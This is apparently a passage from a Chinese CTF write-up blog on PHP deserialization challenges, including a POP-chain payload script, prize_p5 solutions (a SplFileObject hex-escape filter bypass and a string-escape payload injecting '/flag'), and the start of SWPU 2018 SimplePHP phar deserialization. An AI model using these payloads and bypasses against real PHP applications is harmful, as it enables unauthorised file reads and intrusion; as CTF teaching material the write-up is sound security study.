这里w00m是w44m这个类，然后为w22m是Getflag这个函数。</p><p>这里需要触发toString魔术方法，然后通过echo进行输出，echo $this-&gt;w00m;。</p><p>链子：</p><p> getflag -&gt;tostring -&gt; _destruct 很短。</p><p>最后需要进行url编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$c</span>-&gt;w00m=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;w22m=Getflag;<br><span class="hljs-variable">$b</span>-&gt;w00m=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><p>很有意思的一道题目，预期解就是通过字符串逃逸去读取flag非预期就是通过十六进制利用原生类去读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catalogue</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = &quot;<span class="hljs-title">error</span>&quot;;</span><br><span class="hljs-class">        $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span> = &quot;<span class="hljs-title">hacker</span>&quot;;</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">error</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$OTL</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;OTL = <span class="hljs-variable">$OTL</span>;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;hello &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;OTL);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span>&#123;                                                                   <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;OTL&#x27;</span>;                                                 <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-string">&#x27;123666&#x27;</span>;                                             <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;sweet@OTL.com&#x27;</span>;                          <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">abscond</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;NSS&#x27;</span>, <span class="hljs-string">&#x27;CTF&#x27;</span>, <span class="hljs-string">&#x27;OTL_QAQ&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/object/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]))&#123;      <span class="hljs-comment">//这个object就是object字符串 所以用原生类去读取的时候会被过滤掉</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">catalogue</span>(); <br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cc</span>));           <br>    &#125;    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono,you can not do that!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$abscond</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br>        <span class="hljs-variable">$abscond</span>-&gt;name = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span>-&gt;phone = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span>-&gt;email = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$abscond</span>);<br>        <span class="hljs-variable">$escape</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">abscond</span>(<span class="hljs-variable">$abscond</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;email&#x27;</span>]));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先来说一下非预期解：</p><p>非预期就是利用Globlterator  去读取flag的具体位置，但是环境可能出了点问题，出不来，看其他的wp是  /flag</p><p>用SplFileObject  去读取的时候object会被过滤掉</p><p>但是有一种方法就是利用十六进制   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>把SplFileObject前面的那个小写的s替换成大写的S 然后后面的Object任意一个字符替换成十六进制</p><p>Object对应的十六进制是\x4F\x62\x6A\x65\x63\x74  然后传的时候把x去掉</p><p>然后下面是预期解 通过字符串逃逸</p><p>这个题的话可以通过字符串逃逸增加，也可以通过字符串逃逸减少  下面介绍一下字符串逃逸增加的用法</p><p><strong>字符串逃逸增加：</strong></p><p>我这个是通过NSS来的，你通过其他的比hacker少的字符来的话都可以其实</p><p>先来看下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono,you can not do that!&quot;</span>);<br>       &#125;<br>       <span class="hljs-variable">$abscond</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br>       <span class="hljs-variable">$abscond</span>-&gt;name = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span>-&gt;phone = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span>-&gt;email = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$abscond</span>);<br>       <span class="hljs-variable">$escape</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">abscond</span>(<span class="hljs-variable">$abscond</span>)));<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;email&#x27;</span>]));<br>       &#125;<br>       <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;<br></code></pre></td></tr></table></figure><p>这个首先对email的值进行了一个/flag的检测，（不区分大小写）</p><p>然后分别POST传参三个参数 abscond这个函数就是进行一个替换  ‘NSS’, ‘CTF’, ‘OTL_QAQ’, ‘hello’  如果匹配到了上面四个值的话，就会替换成hacker</p><p>接下来进行一个反序列化，get_object_vars这个函数的意思可以看看以下演示的理解一下</p><p>总的说就是<strong>用于获取指定对象的属性和值，并返回一个关联数组。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$person</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-number">25</span>);<br><br><span class="hljs-variable">$vars</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-variable">$person</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$vars</span>);<br><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [name] =&gt; John Doe<br>    [age] =&gt; <span class="hljs-number">25</span><br>)<br><br></code></pre></td></tr></table></figure><p>最后的那个if判断就是如果phone是一个数组的话，就把以email为路径的文件内容给读取并以字符串的形式给打印出来</p><p>最后把内容进行一个base64加密</p><p>分析完后我们通过字符串逃逸的方式，将email的值设为/flag，然后把它给放到name里面去，让它变成一个name的值</p><p>这样就绕过了对email的一个检测</p><p>先来看一下简单的一个测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Nq&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;aa&#x27;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;Nq&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>我们要做的就是将”;s:5:”phone”;a:1:{i:0;s:2:”aa”;}s:5:”email”;s:5:”/flag”;}这个给变成name的一个值</p><p>字符串逃逸的话可以去看看我的这篇博客 （初学者，是自己对反序列化逃逸的一个理解）</p><p>上面我们要塞进去的有58个字符，有一点点长啊</p><p>一个NSS可以逃逸出3个字符，根据计算我们要19个NSS加一个hello</p><p>name的值就是：<br>name=NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShello”;s:5:”phone”;a:1:{i:0;s:2:”aa”;}s:5:”email”;s:5:”/flag”;}</p><p>然后phpone的值随便输就行，注意的是emial的值不能是/flag，其他的都可以</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558491.png" alt="image-20230625162958674"></p><h1 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h1><p>这个题目的话使用到了phar反序列化 总体思路就是构造pop链，生成一个phar文件，由于做了一个白名单限制，但是利用phar伪协议去读取的时候与后缀名无关，关键是里面的数据要对</p><p>所以就手动修改一下后缀名就可以了 上传文件 在upload下查看一下 </p><p>看到上传的文件名 在查看文件那里读取一下就可以了</p><p>重点来看一下这个pop链构造 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable 